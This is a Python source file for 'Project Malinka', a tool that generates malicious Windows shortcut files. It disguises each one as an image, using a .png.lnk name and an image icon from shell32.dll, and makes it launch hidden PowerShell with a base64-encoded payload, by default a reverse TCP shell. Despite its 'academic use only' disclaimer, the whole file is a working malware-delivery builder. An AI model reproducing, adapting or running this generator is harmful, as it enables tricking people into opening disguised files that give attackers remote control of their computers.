"""
	PROJECT MALINKA
	MALICIOUS LINK GENERATOR 
	WRITTEN BY SEM VOIGTLANDER @userlandkenel

	THIS SOFTWARE IS NOT INTENDED FOR ABUSEFUL PURPOSES
	IT IS DISTRIBUTED FOR ACADEMIC USE ONLY
""" 

import os
import sys
import re
import base64
import argparse
from pathlib import Path

verbose = False

WIN8_IMAGE_ICON = 317
WIN10_IMAGE_ICON = 322

try:
  import winshell
except Exception as exc:
  print("Please install the winshell module with pip")

def powershell_encode(data):
	# blank command will store our fixed unicode variable
	blank_command = ""
	powershell_command = ""
	# Remove weird chars that could have been added by ISE
	n = re.compile(u'(\xef|\xbb|\xbf)')
	# loop through each character and insert null byte
	for char in (n.sub("", data)):
		# insert the nullbyte
		blank_command += char + "\x00"
	# assign powershell command as the new one
	powershell_command = blank_command
	# base64 encode the powershell command
	powershell_command = base64.b64encode(powershell_command.encode())
	return powershell_command.decode("utf-8")


class Malinka:

	def __init__(self, scName="screenshot", scComment="Screenshot", scIcon=WIN10_IMAGE_ICON, payload="powershell_reverse_tcp", host="", port=4444):

		""" Shortcut name """		
		if scName:
			self.scName = scName+".lnk"
		else:
			self.scName = "screenshot.png.lnk"

		""" Shortcut comment """
		if scComment:
			self.scComment = scComment
		else:
			self.scComment = ""

		""" Shortcut icon """
		if scIcon:
			self.scIcon = (str(Path(winshell.folder('CSIDL_SYSTEM')) / 'shell32.dll'), int(scIcon))
		else:
			self.scIcon = (str(Path(winshell.folder('CSIDL_SYSTEM')) / 'shell32.dll'), WIN10_IMAGE_ICON)


		""" Powershell payload """
		if payload:
			self.payload = payload
		else:
			self.payload = str(input("Enter payload path: "))


	def createShortcut(self):
		
		if verbose:
			print("Loading payload...")

		payloadBin = open(os.getcwd()+"/payload/"+self.payload+".ps1", 'r').read()

		if verbose:
			print("Loaded payload "+self.payload+" ({} bytes)".format(len(payloadBin)))
			print("Encoding payload...")

		payloadBin = powershell_encode(payloadBin)
		if verbose:
			print("Encoded payload ({} bytes)".format(len(payloadBin)))

		if verbose:
			print("Generating shortcut...")

		outputFile = str(os.getcwd() +"/"+self.scName)
		with winshell.shortcut(outputFile) as malink:
			malink.path = str(Path(winshell.folder('CSIDL_SYSTEM')) / 'WindowsPowerShell' / 'v1.0' / 'powershell.exe')
			malink.description = self.scComment
			malink.arguments = "-nologo -windowstyle hidden -encodedCommand "+payloadBin
			malink.icon_location = self.scIcon
			malink.working_directory = str(Path(winshell.folder('CSIDL_SYSTEM')))
			if verbose:
				print("Payload generated: ")
				malink.dump()

		print("Thanks for using Malinka.")
		print("Malinka is published and developed for academic use only")
		print("Please act with professional and ethical intent when using this software")

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description='Generate malicious shortcuts.')
	parser.add_argument('-p', '--payload', type=str, help="The powershell payload to use, see payloads directory.", required=True)
	parser.add_argument('-n','--name', type=str, help="The name of the shortcut (without extension!)", required=True)
	parser.add_argument('-c','--comment', type=str, help="The comment to use on the shortcut")
	parser.add_argument('-i','--icon', type=int, help="The icon id from shell32.dll to use for the shortcut.")
	#parser.add_argument('-lh', '--LHOST', type=str, help="The host to send connect back shell to.")
	#parser.add_argument('-lp', '--LPORT', type=int, help="The service port to connect back shell to.")
	parser.add_argument('-v','--verbose', action="store_true", help="The service port to connect back shell to.", default=0)
	args = parser.parse_args()

	if args.verbose:
		verbose = True

	generator = Malinka(payload=args.payload, scName=args.name, scComment=args.comment, scIcon=args.icon)
	generator.createShortcut()
